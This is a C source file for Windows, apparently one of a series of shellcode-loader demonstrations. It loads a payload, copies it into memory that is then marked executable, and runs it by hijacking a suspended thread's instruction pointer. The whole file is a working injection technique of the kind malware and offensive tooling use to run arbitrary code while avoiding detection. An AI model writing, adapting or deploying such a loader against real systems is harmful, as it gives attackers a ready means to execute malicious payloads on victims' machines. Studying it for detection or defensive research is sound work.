#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

DWORD WINAPI DummyThread(LPVOID lpParam) {
    while (TRUE) { Sleep(1000); }
    return 0;
}

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Allocating memory (RW)");
    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { PrintError("VirtualAlloc failed"); return 1; }
    printf("[+] Allocated memory at: %p\n", execMem);

    PrintStep(3, "Copying payload");
    memcpy(execMem, payload, payloadSize);
    free(payload);

    PrintStep(4, "Changing memory protection (RW -> RX)");
    DWORD oldProtect;
    VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    PrintStep(5, "Creating dummy thread to hijack");
    HANDLE hThread = CreateThread(NULL, 0, DummyThread, NULL, 0, NULL);
    if (!hThread) { PrintError("CreateThread failed"); return 1; }
    printf("[+] Dummy thread created\n");

    Sleep(100);

    PrintStep(6, "Suspending thread");
    SuspendThread(hThread);

    PrintStep(7, "Getting thread context");
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    printf("[+] Original RIP: 0x%llx\n", ctx.Rip);

    PrintStep(8, "Hijacking thread - setting RIP to payload");
    ctx.Rip = (DWORD64)execMem;
    SetThreadContext(hThread, &ctx);
    printf("[+] New RIP: 0x%llx\n", ctx.Rip);

    PrintStep(9, "Resuming hijacked thread");
    ResumeThread(hThread);
    PrintSuccess("Thread resumed with hijacked RIP");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
